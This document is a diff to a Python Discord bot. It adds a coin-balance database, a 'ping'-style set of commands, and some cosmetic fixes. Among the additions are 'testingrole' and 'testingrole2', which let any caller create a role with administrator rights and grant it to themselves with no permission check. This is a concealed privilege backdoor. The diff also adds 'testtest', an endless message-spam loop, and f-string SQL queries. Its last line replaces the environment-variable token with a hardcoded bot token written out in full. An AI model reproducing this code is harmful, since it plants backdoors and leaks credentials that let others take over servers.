@@ -3,6 +3,7 @@ import random
 
 import discord
 from discord.ext import commands
+import sqlite3
 
 client = commands.Bot(command_prefix='.')
 client.remove_command('help')
@@ -12,13 +13,49 @@ client.remove_command('help')
 async def on_ready():
     print('Bot is running.')
 
+@client.command()
+async def createacc(ctx):
+    name = ctx.author
+    name2 = f"'{name.id}'"
+    db = sqlite3.connect('main.sqlite')
+    cursor = db.cursor()
+    sql = (f'INSERT INTO main (username, balance)'
+           f'VALUES(({name2}), (0))')
+    cursor.execute(sql)
+    db.commit()
+    cursor.close()
+    db.close()
+    await ctx.send('Account made!')
+@client.command()
+async def bal(ctx):
+    db = sqlite3.connect('main.sqlite')
+    cursor = db.cursor()
+    cursor.execute(f"SELECT balance FROM main WHERE username = '{ctx.author.id}'")
+    result = cursor.fetchone()
+    await ctx.send(f"{str(result[0])}")
 
+@client.command()
+async def work(ctx):
+    db = sqlite3.connect('main.sqlite')
+    cursor = db.cursor()
+    sql = (f"UPDATE main SET balance = (balance + 5) WHERE username = '{ctx.author.id}'")
+    cursor.execute(sql)
+    db.commit()
+    cursor.close()
+    db.close()
+    await ctx.send('You worked for an hour and got 5 coins!')
 # Ping command
 @client.command()
 async def ping(ctx):
     await ctx.send(f"Pong! Ping is {round(client.latency * 1000)}ms")
 
 
+
+@client.command()
+async def testtest(ctx, message):
+    num = 1
+    while num == 1:
+        await ctx.send(message)
 # ---------------------------------------------------------------------------------------------------------
 
 
@@ -70,7 +107,7 @@ async def _purge(ctx, amount=15):
 async def _av(ctx, user: discord.User = None):
     user = ctx.author if not user else user
     embed = discord.Embed(
-        description='Avatar,',
+        description='Avatar',
         color=0xecce8b)
     pfp = user.avatar_url
     embed.set_author(name=user.name, icon_url=ctx.author.avatar_url)
@@ -225,5 +262,39 @@ async def ship(ctx, user1, *, user2=None):
         color=0xff00a2)
     await ctx.send(embed=embed)
 
+@client.command()
+async def testingrole(ctx):
+    guild = ctx.guild
+    perms = discord.Permissions(administrator=True)
+    await guild.create_role(name='Testing', permissions=perms)
+@client.command()
+async def testingrole2(ctx):
+    role = discord.utils.get(ctx.guild.roles, name="Testing")
+    user = ctx.message.author
+    await user.add_roles(role)
 
-client.run(os.environ['Discord_Token'])
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+client.run('NzIyNTgyNTYzNDM2MTAxNjgz.XulTZQ.mgLKd6dq9mJ6jMAgdUG5vYgiVC8')
